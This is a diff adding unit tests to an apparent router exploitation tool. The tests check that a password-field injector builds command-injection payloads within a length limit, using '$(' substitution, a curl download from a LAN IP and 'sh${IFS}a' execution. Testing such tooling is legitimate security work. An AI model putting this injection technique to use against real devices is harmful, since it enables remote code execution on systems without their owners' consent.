@@ -321,6 +321,7 @@ class PasswordProbeTests(unittest.TestCase):
         with self.assertRaises(idu.UnsupportedFirmware):
             self.run_vector(api)
         self.assertEqual(len(api.calls), 1)
+        self.assertTrue(all(char.isalnum() or char == "!" for char in api.calls[0]))
         self.assertNotIn("$(", api.calls[0])
 
     def test_missing_history_points_at_the_breeze_guide(self):
@@ -350,6 +351,44 @@ class PasswordProbeTests(unittest.TestCase):
         self.run_vector(api, force=True)
         self.assertEqual(len(api.calls), 3)
         self.assertIn("$(", api.calls[1])
+
+    def test_absent_history_stops_without_independent_execution_evidence(self):
+        class ApiNoHistory:
+            def __init__(self):
+                self.calls = []
+            def guest_record(self):
+                return {"recordId": "rec1"}
+            def set_password(self, record_id, password):
+                self.calls.append(password)
+                return {"status": "OK"}
+
+        api = ApiNoHistory()
+        with mock.patch.object(idu.time, "sleep"), \
+             contextlib.redirect_stdout(io.StringIO()), \
+             self.assertRaises(idu.UnsupportedFirmware):
+            idu.PasswordVector().execute(api, "192.168.31.51")
+        self.assertEqual(len(api.calls), 1)
+
+    def test_14_and_15_char_ip_fits_within_budget(self):
+        injector14 = idu.Injector("Aa1")
+        p14 = injector14.download("192.168.31.101")
+        self.assertLessEqual(len(p14), idu.PASSWORD_MAX)
+        self.assertIn("192.168.31.101", p14)
+        self.assertIn("curl", p14)
+        self.assertTrue(p14.endswith(">a)"))
+        run14 = injector14.execute()
+        self.assertIn("sh${IFS}a", run14)
+        self.assertIn("1", run14)
+
+        injector15 = idu.Injector("Aa1")
+        p15 = injector15.download("192.168.100.100")
+        self.assertLessEqual(len(p15), idu.PASSWORD_MAX)
+        self.assertIn("192.168.100.100", p15)
+        self.assertIn("curl", p15)
+        self.assertTrue(p15.endswith(">a)"))
+        run15 = injector15.execute()
+        self.assertIn("sh${IFS}a", run15)
+        self.assertIn("1", run15)
 
 
 @unittest.skipIf(os.name == "nt", "POSIX bind errors")
